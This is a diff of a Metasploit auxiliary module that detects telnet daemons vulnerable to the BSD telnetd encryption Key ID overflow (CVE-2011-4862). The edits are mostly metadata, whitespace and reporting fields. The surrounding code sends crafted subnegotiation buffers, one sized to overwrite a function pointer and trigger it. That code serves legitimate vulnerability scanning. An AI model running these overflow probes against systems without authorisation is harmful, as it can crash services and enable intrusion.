@@ -1,12 +1,8 @@
 ##
-# $Id$
-##
-
-##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 require 'msf/core'
@@ -20,7 +16,6 @@ class Metasploit3 < Msf::Auxiliary
 	def initialize
 		super(
 			'Name'        => 'Telnet Service Encyption Key ID Overflow Detection',
-			'Version'     => '$Revision$',
 			'Description' => 'Detect telnet services vulnerable to the encrypt option Key ID overflow (BSD-derived telnetd)',
 			'Author'      => [ 'Jaime Penalba Estebanez <jpenalbae[at]gmail.com>', 'hdm' ],
 			'License'     => MSF_LICENSE,
@@ -28,7 +23,8 @@ class Metasploit3 < Msf::Auxiliary
 				[
 					['BID', '51182'],
 					['CVE', '2011-4862'],
-					['URL', 'http://www.exploit-db.com/exploits/18280/']
+					['EDB', '18280'],
+					['URL', 'https://community.rapid7.com/community/metasploit/blog/2011/12/28/more-fun-with-bsd-derived-telnet-daemons']
 				]
 		)
 		register_options(
@@ -47,14 +43,14 @@ class Metasploit3 < Msf::Auxiliary
 		begin
 			::Timeout.timeout(to) do
 				res = connect
-				
+
 				# This makes db_services look a lot nicer.
 				banner_sanitized = Rex::Text.to_hex_ascii(banner.to_s)
-				report_service(:host => rhost, :port => rport, :name => "telnet", :info => banner_sanitized)
-				
+				svc = report_service(:host => rhost, :port => rport, :name => "telnet", :info => banner_sanitized)
+
 				# Check for encryption option ( IS(0) DES_CFB64(1) )
 				sock.put("\xff\xfa\x26\x00\x01\x01\x12\x13\x14\x15\x16\x17\x18\x19\xff\xf0")
-				
+
 				loop do
 					data = sock.get_once(-1, to) rescue nil
 					if not data
@@ -66,9 +62,9 @@ class Metasploit3 < Msf::Auxiliary
 
 				buff_good = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 63) + "\xff\xf0"
 				buff_long = "\xff\xfa\x26" + "\x07" + "\x00" + ("X" * 64) + ( "\xcc" * 32) + "\xff\xf0"
-				
+
 				begin
-				
+
 					#
 					# Send a long, but within boundary Key ID
 					#
@@ -78,12 +74,12 @@ class Metasploit3 < Msf::Auxiliary
 						print_status("#{ip}:#{rport} UNKNOWN: No response to the initial probe: #{banner_sanitized}")
 						return
 					end
-					
+
 					unless data.index("\xff\xfa\x26\x08\xff\xf0")
 						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
 						return
 					end
-					
+
 					#
 					# First round to overwrite the function pointer itself
 					#
@@ -97,7 +93,7 @@ class Metasploit3 < Msf::Auxiliary
 					unless data.index("\xff\xfa\x26\x08\xff\xf0")
 						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to first Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
 						return
-					end			
+					end
 
 					#
 					# Second round to force the function to be called
@@ -112,27 +108,26 @@ class Metasploit3 < Msf::Auxiliary
 					unless data.index("\xff\xfa\x26\x08\xff\xf0")
 						print_status("#{ip}:#{rport} UNKNOWN: Invalid reply to second Key ID: #{data.unpack("H*")[0]} - #{banner_sanitized}")
 						return
-					end		
-					
+					end
+
 					print_status("#{ip}:#{rport} NOT VULNERABLE: Service did not disconnect: #{banner_sanitized}")
 					return
-					
-				rescue ::EOFError	
-				end						
-				
+
+				rescue ::EOFError
+				end
+
 				# EOFError or response to 64-byte Key Id indicates vulnerable systems
 				print_good("#{ip}:#{rport} VULNERABLE: #{banner_sanitized}")
 				report_vuln(
 					{
-							:host	=> ip,
-							:port	=> rport,
-							:proto  => 'tcp',
-							:name	=> self.fullname,
-							:info	=> banner_sanitized,
-							:refs   => self.references
+							:host	  => ip,
+							:service  => svc,
+							:name	  => self.name,
+							:info	  => "Module #{self.fullname} confirmed acceptance of a long key ID: #{banner_sanitized}",
+							:refs     => self.references
 					}
 				)
-				
+
 			end
 		rescue ::Rex::ConnectionError
 		rescue Timeout::Error
@@ -144,4 +139,3 @@ class Metasploit3 < Msf::Auxiliary
 		end
 	end
 end
-
